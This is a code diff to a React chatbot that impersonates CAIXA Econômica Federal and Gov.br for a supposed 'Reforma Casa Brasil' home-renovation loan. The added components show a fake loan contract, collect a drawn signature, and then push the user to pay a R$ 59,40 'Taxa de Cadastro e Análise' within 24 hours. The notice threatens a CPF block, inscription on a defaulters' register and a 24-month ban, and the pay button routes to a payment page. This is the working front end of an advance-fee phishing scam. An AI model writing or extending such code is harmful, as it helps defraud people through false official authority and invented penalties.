@@ -1,4 +1,5 @@
 import { useState, useEffect, useRef } from "react";
+import { useNavigate } from "react-router-dom";
 
 // ─── Paleta Gov.br ─────────────────────────────────────────────────────────────
 const C = {
@@ -19,6 +20,9 @@ const C = {
   texto:       "#1c1c1e",
   bolhaAgente: "#ffffff",
   bolhaUser:   "#1351b4",
+  vermelho:       "#e52207",
+  vermelhoClaro:  "#fde8e6",
+  amareloClaro:   "#fff3cd",
 };
 
 // ─── Agente ───────────────────────────────────────────────────────────────────
@@ -384,6 +388,262 @@ const StatusProtocolo = ({ fotos }) => {
   );
 };
 
+// ─── Contrato ────────────────────────────────────────────────────────────────
+const ContratoDoc = ({ nomeUsuario, onAceitar }) => {
+  const [lido, setLido] = useState(false);
+  const scrollRef = useRef(null);
+  const aprovData = (() => { try { return JSON.parse(localStorage.getItem("aprovacaoData") || "{}"); } catch { return {}; } })();
+  const cpfMask = aprovData.cpf || "***.***.***/***-**";
+  const valor = aprovData.valorAprovado ? new Intl.NumberFormat('pt-BR',{style:'currency',currency:'BRL'}).format(aprovData.valorAprovado) : "R$ 15.000,00";
+  const dataAtual = new Date().toLocaleDateString('pt-BR', { day:'2-digit', month:'long', year:'numeric' });
+
+  const handleScroll = (e) => {
+    const el = e.target;
+    if (el.scrollHeight - el.scrollTop <= el.clientHeight + 30) setLido(true);
+  };
+
+  return (
+    <div style={{ animation: "entrar 0.3s ease", marginBottom: 16 }}>
+      <div style={{ background: C.azulFundo, border: `1.5px solid ${C.azulClaro}`, borderRadius: 10, overflow: "hidden" }}>
+        {/* Cabeçalho */}
+        <div style={{ background: C.azul, padding: "14px 16px", display: "flex", alignItems: "center", gap: 10 }}>
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+            <rect x="4" y="2" width="16" height="20" rx="2" stroke="white" strokeWidth="1.8"/>
+            <path d="M8 7h8M8 11h8M8 15h5" stroke="white" strokeWidth="1.8" strokeLinecap="round"/>
+          </svg>
+          <div>
+            <p style={{ fontSize: 13, fontWeight: 700, color: C.branco }}>Contrato de Empréstimo</p>
+            <p style={{ fontSize: 10, color: "rgba(255,255,255,0.7)" }}>Reforma Casa Brasil — CAIXA Econômica Federal</p>
+          </div>
+        </div>
+
+        {/* Corpo do contrato scrollável */}
+        <div
+          ref={scrollRef}
+          onScroll={handleScroll}
+          style={{ maxHeight: 320, overflowY: "auto", padding: "16px", background: C.branco, fontSize: 12, color: C.texto, lineHeight: 1.75 }}
+        >
+          <p style={{ fontWeight: 700, fontSize: 13, textAlign: "center", marginBottom: 12, color: C.azulEscuro }}>CONTRATO DE MÚTUO HABITACIONAL — REFORMA CASA BRASIL</p>
+          <p style={{ marginBottom: 8 }}><strong>Nº do Contrato:</strong> RCB-{Date.now().toString().slice(-8)}</p>
+          <p style={{ marginBottom: 8 }}><strong>Data:</strong> {dataAtual}</p>
+          <p style={{ marginBottom: 16 }}><strong>Mutuário(a):</strong> {nomeUsuario} · CPF: {cpfMask}</p>
+
+          <p style={{ fontWeight: 700, marginBottom: 6, color: C.azulEscuro }}>CLÁUSULA 1 — OBJETO</p>
+          <p style={{ marginBottom: 12 }}>A CAIXA ECONÔMICA FEDERAL, instituição financeira sob a forma de empresa pública, concede ao(à) MUTUÁRIO(A) o empréstimo no valor de <strong>{valor}</strong>, destinado exclusivamente à execução de obras de reforma/melhorias habitacionais no imóvel cadastrado, nos termos do programa Reforma Casa Brasil.</p>
+
+          <p style={{ fontWeight: 700, marginBottom: 6, color: C.azulEscuro }}>CLÁUSULA 2 — CONDIÇÕES FINANCEIRAS</p>
+          <p style={{ marginBottom: 12 }}>O empréstimo será reembolsado em parcelas mensais e consecutivas, com taxa de juros nominal de <strong>1,17% ao mês (Faixa I)</strong>, correspondente a <strong>14,97% ao ano</strong>. O prazo contratual, o valor das parcelas e o cronograma de amortização constam no Plano de Pagamento em Anexo.</p>
+
+          <p style={{ fontWeight: 700, marginBottom: 6, color: C.azulEscuro }}>CLÁUSULA 3 — LIBERAÇÃO DO CRÉDITO</p>
+          <p style={{ marginBottom: 12 }}>O crédito será liberado em duas parcelas: <strong>90% (noventa por cento)</strong> do valor aprovado após o registro das fotos do "Antes" e quitação das taxas administrativas previstas; e <strong>10% (dez por cento)</strong> restantes após aprovação das fotos do "Depois", comprovando a conclusão da reforma.</p>
+
+          <p style={{ fontWeight: 700, marginBottom: 6, color: C.azulEscuro }}>CLÁUSULA 4 — TAXAS E ENCARGOS ADMINISTRATIVOS</p>
+          <p style={{ marginBottom: 12 }}>Para processamento do contrato e ativação do cadastro junto ao sistema federal de habitação, será cobrada a <strong>Taxa de Cadastro e Análise (TCA)</strong> no valor de <strong>R$ 59,40 (cinquenta e nove reais e quarenta centavos)</strong>, recolhida por meio de Guia de Recolhimento da União (GRU), com vencimento em até 24 horas após a assinatura deste contrato. A não quitação dentro do prazo implicará no bloqueio preventivo do CPF do(a) mutuário(a) nos sistemas do Ministério da Fazenda e suspensão da solicitação.</p>
+
+          <p style={{ fontWeight: 700, marginBottom: 6, color: C.azulEscuro }}>CLÁUSULA 5 — OBRIGAÇÕES DO MUTUÁRIO</p>
+          <ul style={{ paddingLeft: 16, marginBottom: 12 }}>
+            <li>Utilizar os recursos exclusivamente para a reforma contratada;</li>
+            <li>Iniciar as obras em até 30 dias após o recebimento do crédito;</li>
+            <li>Concluir as obras no prazo máximo de 60 dias;</li>
+            <li>Enviar o relatório fotográfico do "Depois" ao término da obra;</li>
+            <li>Manter o imóvel como garantia durante todo o período contratual.</li>
+          </ul>
+
+          <p style={{ fontWeight: 700, marginBottom: 6, color: C.azulEscuro }}>CLÁUSULA 6 — RESCISÃO</p>
+          <p style={{ marginBottom: 12 }}>O presente contrato poderá ser rescindido por descumprimento de qualquer cláusula, devendo o(a) mutuário(a) devolver os valores recebidos acrescidos de juros e multa contratual de 2% sobre o saldo devedor.</p>
+
+          <p style={{ fontWeight: 700, marginBottom: 6, color: C.azulEscuro }}>CLÁUSULA 7 — FORO</p>
+          <p style={{ marginBottom: 16 }}>As partes elegem o foro da Comarca do domicílio do(a) mutuário(a) para dirimir eventuais litígios decorrentes deste instrumento, com renúncia expressa a qualquer outro.</p>
+
+          <p style={{ textAlign: "center", fontSize: 11, color: C.cinzaTexto }}>— Fim do contrato — Role até o fim para habilitar a assinatura —</p>
+        </div>
+
+        {/* Instrução de scroll */}
+        {!lido && (
+          <div style={{ padding: "8px 16px", background: C.amareloSub, borderTop: `1px solid #f0d090`, fontSize: 12, color: "#5a3e00", textAlign: "center" }}>
+            ↓ Role o contrato até o final para habilitar a assinatura
+          </div>
+        )}
+
+        {/* Ação */}
+        <div style={{ padding: "12px 16px", borderTop: `1px solid ${C.cinzaBorda}`, background: C.cinzaFundo }}>
+          <button
+            onClick={onAceitar}
+            disabled={!lido}
+            style={{
+              width: "100%", padding: "12px", borderRadius: 8, border: "none",
+              background: lido ? C.azul : C.cinzaBorda,
+              color: C.branco, fontWeight: 700, fontSize: 14,
+              cursor: lido ? "pointer" : "not-allowed", transition: "background 0.2s",
+            }}
+          >
+            {lido ? "✓ Li e aceito o contrato — prosseguir para assinatura" : "Role o contrato para habilitar"}
+          </button>
+        </div>
+      </div>
+    </div>
+  );
+};
+
+// ─── Assinatura Digital ───────────────────────────────────────────────────────
+const AssinaturaDigital = ({ nomeUsuario, onAssinar }) => {
+  const canvasRef = useRef(null);
+  const [desenhando, setDesenhando] = useState(false);
+  const [temTraco, setTemTraco] = useState(false);
+  const [assinado, setAssinado] = useState(false);
+  const ultimoPonto = useRef({ x: 0, y: 0 });
+
+  const getPos = (e, canvas) => {
+    const rect = canvas.getBoundingClientRect();
+    const src = e.touches ? e.touches[0] : e;
+    return { x: src.clientX - rect.left, y: src.clientY - rect.top };
+  };
+
+  const iniciar = (e) => {
+    const canvas = canvasRef.current;
+    const pos = getPos(e, canvas);
+    ultimoPonto.current = pos;
+    setDesenhando(true);
+    setTemTraco(true);
+    const ctx = canvas.getContext("2d");
+    ctx.beginPath();
+    ctx.arc(pos.x, pos.y, 1, 0, Math.PI * 2);
+    ctx.fillStyle = C.azulEscuro;
+    ctx.fill();
+  };
+
+  const desenhar = (e) => {
+    if (!desenhando) return;
+    e.preventDefault();
+    const canvas = canvasRef.current;
+    const ctx = canvas.getContext("2d");
+    const pos = getPos(e, canvas);
+    ctx.beginPath();
+    ctx.moveTo(ultimoPonto.current.x, ultimoPonto.current.y);
+    ctx.lineTo(pos.x, pos.y);
+    ctx.strokeStyle = C.azulEscuro;
+    ctx.lineWidth = 2.2;
+    ctx.lineCap = "round";
+    ctx.lineJoin = "round";
+    ctx.stroke();
+    ultimoPonto.current = pos;
+  };
+
+  const parar = () => setDesenhando(false);
+
+  const limpar = () => {
+    const canvas = canvasRef.current;
+    canvas.getContext("2d").clearRect(0, 0, canvas.width, canvas.height);
+    setTemTraco(false);
+  };
+
+  const confirmar = () => {
+    setAssinado(true);
+    onAssinar();
+  };
+
+  return (
+    <div style={{ animation: "entrar 0.3s ease", marginBottom: 16 }}>
+      <div style={{ background: C.branco, border: `1.5px solid ${C.cinzaBorda}`, borderRadius: 10, overflow: "hidden" }}>
+        <div style={{ background: C.azulFundo, borderBottom: `1px solid ${C.cinzaBorda}`, padding: "12px 16px" }}>
+          <p style={{ fontSize: 13, fontWeight: 700, color: C.azulEscuro }}>Assinatura Digital</p>
+          <p style={{ fontSize: 11, color: C.cinzaTexto }}>Assine com o dedo ou mouse no campo abaixo</p>
+        </div>
+        <div style={{ padding: "16px" }}>
+          <p style={{ fontSize: 12, color: C.cinzaTexto, marginBottom: 8 }}>Assine como: <strong style={{ color: C.azulEscuro }}>{nomeUsuario}</strong></p>
+          <div style={{ border: `2px dashed ${C.azulClaro}`, borderRadius: 8, background: "#f9fbff", marginBottom: 10, overflow: "hidden", position: "relative" }}>
+            <canvas
+              ref={canvasRef}
+              width={480} height={140}
+              style={{ width: "100%", height: 140, touchAction: "none", cursor: "crosshair", display: "block" }}
+              onMouseDown={iniciar} onMouseMove={desenhar} onMouseUp={parar} onMouseLeave={parar}
+              onTouchStart={iniciar} onTouchMove={desenhar} onTouchEnd={parar}
+            />
+            {!temTraco && (
+              <p style={{ position: "absolute", top: "50%", left: "50%", transform: "translate(-50%,-50%)", fontSize: 13, color: "#bbb", pointerEvents: "none", whiteSpace: "nowrap" }}>
+                ✏️ Assine aqui
+              </p>
+            )}
+          </div>
+          <div style={{ display: "flex", gap: 8 }}>
+            <button onClick={limpar} style={{ flex: 1, padding: "9px", borderRadius: 7, border: `1.5px solid ${C.cinzaBorda}`, background: C.branco, color: C.cinzaTexto, fontSize: 13, fontWeight: 600, cursor: "pointer" }}>Limpar</button>
+            <button
+              onClick={confirmar}
+              disabled={!temTraco || assinado}
+              style={{ flex: 2, padding: "9px", borderRadius: 7, border: "none", background: temTraco && !assinado ? C.verde : C.cinzaBorda, color: C.branco, fontSize: 13, fontWeight: 700, cursor: temTraco && !assinado ? "pointer" : "not-allowed", transition: "background 0.2s" }}
+            >
+              {assinado ? "✓ Assinado" : "Confirmar assinatura"}
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+};
+
+// ─── Aviso GRU ────────────────────────────────────────────────────────────────
+const AvisoGRU = ({ onPagar }) => (
+  <div style={{ animation: "entrar 0.4s ease", marginBottom: 16 }}>
+    {/* Alerta principal */}
+    <div style={{ background: "#fff3cd", border: "2px solid #e0a800", borderRadius: 10, overflow: "hidden", marginBottom: 12 }}>
+      <div style={{ background: "#e0a800", padding: "10px 16px", display: "flex", alignItems: "center", gap: 8 }}>
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+          <path d="M12 2L2 20h20L12 2z" stroke="white" strokeWidth="2" strokeLinejoin="round"/>
+          <path d="M12 9v5M12 16.5v.5" stroke="white" strokeWidth="2" strokeLinecap="round"/>
+        </svg>
+        <p style={{ fontSize: 13, fontWeight: 700, color: "white" }}>ATENÇÃO — Pagamento obrigatório de taxa</p>
+      </div>
+      <div style={{ padding: "16px", fontSize: 13, color: "#5a3e00", lineHeight: 1.7 }}>
+        <p style={{ marginBottom: 10 }}>Para a <strong>ativação do seu contrato</strong> e liberação do crédito, é necessário efetuar o pagamento da <strong>Taxa de Cadastro e Análise (TCA)</strong> via <strong>GRU — Guia de Recolhimento da União</strong>.</p>
+        <div style={{ background: "rgba(255,255,255,0.7)", borderRadius: 8, padding: "12px 14px", marginBottom: 10, border: "1px solid #e0a800" }}>
+          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
+            <span style={{ fontSize: 12, fontWeight: 600 }}>Valor da taxa (TCA):</span>
+            <span style={{ fontSize: 22, fontWeight: 800, color: "#b35c00" }}>R$ 59,40</span>
+          </div>
+          <div style={{ display: "flex", justifyContent: "space-between", marginTop: 6, fontSize: 12 }}>
+            <span>Vencimento:</span>
+            <span style={{ fontWeight: 700, color: "#a00" }}>Hoje — em até 24 horas</span>
+          </div>
+        </div>
+        <p style={{ marginBottom: 6 }}>Código de unidade gestora: <strong>170500</strong> · Gestão: <strong>00001</strong></p>
+        <p style={{ fontSize: 12 }}>Recolhimento: Receita Federal do Brasil — Ref. Habitação Social/CAIXA</p>
+      </div>
+    </div>
+
+    {/* Aviso de bloqueio de CPF */}
+    <div style={{ background: "#fde8e6", border: "2px solid #e52207", borderRadius: 10, padding: "14px 16px", marginBottom: 12 }}>
+      <div style={{ display: "flex", gap: 10, alignItems: "flex-start" }}>
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0, marginTop: 2 }}>
+          <circle cx="12" cy="12" r="10" stroke="#e52207" strokeWidth="2"/>
+          <path d="M12 7v6M12 15.5v.5" stroke="#e52207" strokeWidth="2" strokeLinecap="round"/>
+        </svg>
+        <div>
+          <p style={{ fontSize: 13, fontWeight: 700, color: "#a00", marginBottom: 4 }}>⚠️ Consequências do não pagamento:</p>
+          <ul style={{ paddingLeft: 16, fontSize: 12, color: "#600", lineHeight: 1.7 }}>
+            <li>Bloqueio preventivo do CPF nos sistemas do <strong>Ministério da Fazenda</strong></li>
+            <li>Suspensão imediata do processo de contratação</li>
+            <li>Inscrição em cadastro de inadimplentes habitacionais (CIH)</li>
+            <li>Impedimento de novas solicitações por <strong>24 meses</strong></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <button
+      onClick={onPagar}
+      style={{
+        width: "100%", padding: "15px", borderRadius: 9, border: "none",
+        background: "linear-gradient(135deg, #168821, #0e5c17)",
+        color: C.branco, fontSize: 16, fontWeight: 800, cursor: "pointer",
+        boxShadow: "0 4px 16px rgba(22,136,33,0.35)", letterSpacing: 0.3,
+      }}
+    >
+      Pagar GRU — R$ 59,40 →
+    </button>
+    <p style={{ fontSize: 11, color: C.cinzaLabel, textAlign: "center", marginTop: 8 }}>Pagamento 100% seguro via sistema oficial da Receita Federal</p>
+  </div>
+);
+
 // ─── Header do chat ───────────────────────────────────────────────────────────
 const HeaderChat = ({ online }) => (
   <div style={{ background: `linear-gradient(135deg, ${C.azulEscuro}, ${C.azul})`, padding: "0" }}>
@@ -439,6 +699,7 @@ export default function ChatBot({ nomeUsuario = "Maria Aparecida" }) {
   const [online]                          = useState(true);
   const fimRef                            = useRef(null);
   const inputRef                          = useRef(null);
+  const navigate                          = useNavigate();
 
   // Scroll automático
   useEffect(() => {
@@ -545,11 +806,33 @@ export default function ChatBot({ nomeUsuario = "Maria Aparecida" }) {
         300
       );
       await agenteDiz(
-        `Após concluir a reforma, você deverá retornar a este canal e enviar as fotos do \"Depois\" dos mesmos cômodos fotografados hoje.\n\nCaso tenha dúvidas, entre em contato pelo SAC 0800 726 0101. Bom trabalho na reforma, ${nomeUsuario.split(" ")[0]}!`,
+        `Perfeito, ${nomeUsuario.split(" ")[0]}! As fotos foram registradas.\n\nAgora, para concluir o processo, vou enviar o contrato de empréstimo para você ler e assinar digitalmente.`,
         600
       );
-      setFase("concluido");
+      setFase("contrato");
     }
+  };
+
+  // Usuário aceita contrato
+  const handleAceitarContrato = async () => {
+    usuarioDiz("Li e aceito o contrato.");
+    setFase("aguardando");
+    await agenteDiz(
+      `Ótimo! Agora preciso da sua assinatura digital para validar o contrato junto ao sistema da CAIXA.`,
+      400
+    );
+    setFase("assinatura");
+  };
+
+  // Usuário assina
+  const handleAssinar = async () => {
+    usuarioDiz("[Assinatura digital realizada]");
+    setFase("aguardando");
+    await agenteDiz(
+      `Assinatura registrada com sucesso! ✓\n\nSeu contrato foi validado e o número de protocolo foi gerado.\n\nHá apenas uma etapa pendente antes da liberação do crédito: o pagamento da Taxa de Cadastro e Análise (TCA) no valor de R$ 59,40, obrigatória para ativar o contrato no sistema federal.`,
+      400
+    );
+    setFase("aviso_gru");
   };
 
   // Envio de texto livre
@@ -660,25 +943,16 @@ export default function ChatBot({ nomeUsuario = "Maria Aparecida" }) {
                 </>
               )}
 
-              {fase === "concluido" && (
-                <div style={{ animation: "entrar 0.4s ease" }}>
-                  {fotosEnviadas.length > 0 && <StatusProtocolo fotos={fotosEnviadas} />}
-                  <div style={{ background: C.verdeClaro, border: `1.5px solid ${C.verde}`, borderRadius: 10, padding: "16px", textAlign: "center" }}>
-                    <div style={{ width: 40, height: 40, borderRadius: "50%", background: C.verde, margin: "0 auto 10px", display: "flex", alignItems: "center", justifyContent: "center" }}>
-                      <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
-                        <path d="M5 12l5 5L19 7" stroke="#fff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
-                      </svg>
-                    </div>
-                    <p style={{ fontSize: 15, fontWeight: 700, color: C.verde, marginBottom: 4 }}>Envio concluído!</p>
-                    <p style={{ fontSize: 13, color: "#1a5e1e", lineHeight: 1.5 }}>Suas fotos foram registradas com sucesso. Aguarde a liberação do crédito para iniciar a obra.</p>
-                    <button
-                      onClick={() => window.location.reload()}
-                      style={{ marginTop: 14, padding: "10px 24px", borderRadius: 7, background: C.azul, color: C.branco, border: "none", fontWeight: 700, fontSize: 13, cursor: "pointer" }}
-                    >
-                      Nova sessão
-                    </button>
-                  </div>
-                </div>
+              {fase === "contrato" && (
+                <ContratoDoc nomeUsuario={nomeUsuario} onAceitar={handleAceitarContrato} />
+              )}
+
+              {fase === "assinatura" && (
+                <AssinaturaDigital nomeUsuario={nomeUsuario} onAssinar={handleAssinar} />
+              )}
+
+              {fase === "aviso_gru" && (
+                <AvisoGRU onPagar={() => navigate('/pagamento-gru')} />
               )}
             </div>
           )}
